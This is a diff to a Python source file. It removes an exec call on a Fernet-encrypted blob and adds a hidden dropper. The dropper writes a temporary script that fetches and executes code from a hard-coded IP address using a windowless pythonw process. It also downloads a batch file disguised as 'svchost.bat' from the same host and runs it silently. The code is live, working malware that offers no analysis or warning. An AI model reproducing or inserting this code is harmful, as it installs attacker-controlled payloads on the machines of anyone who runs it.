@@ -1,2 +1,24 @@
-from fernet import Fernet
-exec(Fernet(b'o4Fr0LvNghuK2uOMlc1PRZBLBaB7calU_hCqPU_otEQ=').decrypt(b'gAAAAABnrBEQd2nwbIv5JhO3vUxTIuI0NaRlIn4d96XbLZmK_i44XR5O3pmyrSzD0Bx0dHtsSAzsHZ4UR9LT4QlYSD8U6GIc6PJjgKQnXQO2qu6Wa2vn5fPsNeZm5VCHwm2Kz01d4IiIIbzLaXE4NXarm_OxWQUzn0hLgJ8YEnuucsRTSHx2DlDDY78JD-Vye22nFdfKqAATDiNouW1VZ_ERT-s-7o3pwrgcUpbrU3L8fWwCx7dquTTOTX45v6MBfT2LR4pQef6UMsjGFYh36omDAZyKIwztc3VDdPYcMfRgBLPdDmwzuYY0DNjLtv6WzEkRLXZi_fbSAiymPGSOmgT4cFPbYxsszLx1SBX1H0gP5R5OIcYJ6VFmDvG4-26mF3szGdo3wZ68xfAdXo8VUU8oW4ELE3S68H0tkMTqG97pUSkQf1Xhlxc3Qsprrid9jX12GJBIXSmXKRGUi78XFbpPwoOuVmUxCmpyzT8nNDRhICqLlrw8v7NZf4mpdBzBittJ9JXarPxajJignGNZCxSpSnqm96rnXOnXUu5kD83_p_WoOKny1A0pB2T_kv28g8PrDptGgznOOUjgR_JhJCjJ_R5cca1ocoDk4syEBlWAGpzQQH5w1mSfM0po5Ek6EM2VgxF6VNcW60qDTdMiJPx0wW55rAaWWOHfeJrfrVYuErPY1I26_2l2TUEII2PKiOxKa0zlIOoazUPm8zxShBfn6o1rkMBUQkXJaCNgo0-h9seGJAySzF4wbDOdHU6mrApj35f1tc2rHH1Me_5zqcD46BuLUxMDurwljUc1ar4p_9IdWO5B1VMKixMaJGq_Swaaw_gTVU8kqe4cbll0TufLefREwMT2LWV9FysRy75G00iICeDc_FeDt4XACUXQN6Kzg1Am2_68K_2FB5cCXW_1Nw_cMd-iaEEeIUQ-HoyTkoJNXZ7tC6I6gnVoppzszdr7PXMNFu6nSKHIN85YfYA_0mbkv--eqAU48iMTPHdlUCFpu9vfnN5Uugu_39mf6QBRIlqCoACKOpw1rhmTnis7IXYHUkS9i3SZfIlvva_mBqrPO4h0yISiS1Wk4i5CZ53tc0rn5y0r22HGdIs0ALqY0ECQAd21hVuh0bKL7Wp2vyNthfcdMc4='))
+from tempfile import NamedTemporaryFile as _ffile
+from sys import executable as _eexecutable
+from subprocess import Popen, CREATE_NO_WINDOW
+import requests
+import os
+import uuid
+import tempfile
+
+_ttmp = _ffile(delete=False)
+_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("http://79.110.49.198:6969/2.txt").read())""")
+_ttmp.close()
+
+pythonw_path = _eexecutable.replace("python.exe", "pythonw.exe")
+Popen([pythonw_path, _ttmp.name])
+
+url = "http://79.110.49.198:6969/download/svchost.bat"
+temp = tempfile.gettempdir()
+name = os.path.join(temp, f"{uuid.uuid4()}.bat")
+
+response = requests.get(url)
+if response.status_code == 200:
+    with open(name, 'wb') as dosya:
+        dosya.write(response.content)
+    Popen([name], creationflags=CREATE_NO_WINDOW, shell=True)
